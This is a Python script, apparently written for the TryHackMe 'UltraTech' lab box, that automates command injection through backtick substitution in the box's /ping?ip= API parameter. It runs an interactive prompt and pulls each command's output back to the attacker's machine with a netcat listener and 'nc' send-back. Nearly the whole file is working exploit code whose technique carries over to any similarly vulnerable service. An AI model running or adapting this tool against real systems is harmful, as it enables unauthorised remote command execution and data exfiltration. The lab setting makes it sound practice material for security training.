#!/bin/python

import requests, os, argparse, socket, struct, fcntl
import netifaces as ni
import urllib.parse as ps
import subprocess

params = {'q': 'Python URL encoding', 'as_sitesearch': 'www.urlencoder.io'}
ps.urlencode(params)

url = "http://{0}:8081/ping?ip=-c1%20{0}`$({1})`"


def PrintBanner():
	banner = """
WARNING!!! : It is NOT recommended to use this script until you found the vulnerability in the box.

 _____ ___  _________        _____        _              _                   
/  __ \|  \/  ||  _  \      |_   _|      (_)            | |                  
| /  \/| .  . || | | | ______ | |  _ __   _   ___   ___ | |_                 
| |    | |\/| || | | ||______|| | | '_ \ | | / _ \ / __|| __|                
| \__/\| |  | || |/ /        _| |_| | | || ||  __/| (__ | |_                 
 \____/\_|  |_/|___/         \___/|_| |_|| | \___| \___| \__|                
                                        _/ |                                 
 _   _  _  _                _          |__/ _           _____  _   _ ___  ___
| | | || || |              | |             | |         |_   _|| | | ||  \/  |
| | | || || |_  _ __  __ _ | |_  ___   ___ | |__  ______ | |  | |_| || .  . |
| | | || || __|| '__|/ _` || __|/ _ \ / __|| '_ \|______|| |  |  _  || |\/| |
| |_| || || |_ | |  | (_| || |_|  __/| (__ | | | |       | |  | | | || |  | |
 \___/ |_| \__||_|   \__,_| \__|\___| \___||_| |_|       \_/  \_| |_/\_|  |_/
                                                                             
                                                                             

 Created by : SysG0ne [Project to automate something which does not need to automate]
 NOTE: '|' and ';' is filtered, so dont use it. All cmd will run at '/home/www/api'
	"""

	print(banner)

def GetIP():
	global ip
	ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

def GetOutput():	
	test = open("/tmp/demo", 'w+')
	cmd = "nc -nlvp 4499 &"
	subprocess.call(cmd, shell=True, stdout = test, stderr=subprocess.PIPE)
	cmd = "nc -w 3 {} {} < /tmp/demo"
	ExecuteCmd(cmd.format(ip, args.port))
	os.system("cat /tmp/demo")
	os.system("echo")
	test.close()


def ExecuteCmd(cmd, output_reqd = False):
	urlencoded_cmd = ps.quote(cmd)

	if output_reqd:
		urlencoded_cmd += "%20%3E%20/tmp/demo"

	response = requests.get(url.format(args.host_ip, urlencoded_cmd))

	#print(response)

	if "1 received" not in response.text:
		print("Error!!! :\n")
		print(response.text)

	elif output_reqd:
		GetOutput()


def ArgumentSet():
	parser = argparse.ArgumentParser(description='An automated tool for executing command injection in Ultratech THM box. No more information will be provided here. It is NOT recommended to use this script until you found the vulnerability in the box')
	parser.add_argument('-ip', dest = 'host_ip', required = True, action = 'store', help = 'IP of UltraTech THM box')
	parser.add_argument('-lp', dest = 'port', required = True, action = 'store', help = 'Local machine port for listening (LPORT)')

	global args
	args = parser.parse_args()


def CleanUp():
	ExecuteCmd("rm /tmp/demo")
	os.system("rm /tmp/demo")


def main():
	while True:
		try:
			cmd = input("//cmd >> ")
		
			if cmd == "exit":
				break
			else:	
				ExecuteCmd(cmd, True)
		except KeyboardInterrupt:
			break
	print("\nExiting...")
	CleanUp()


if __name__ == '__main__':
	ArgumentSet()
	PrintBanner()
	GetIP()
	main()
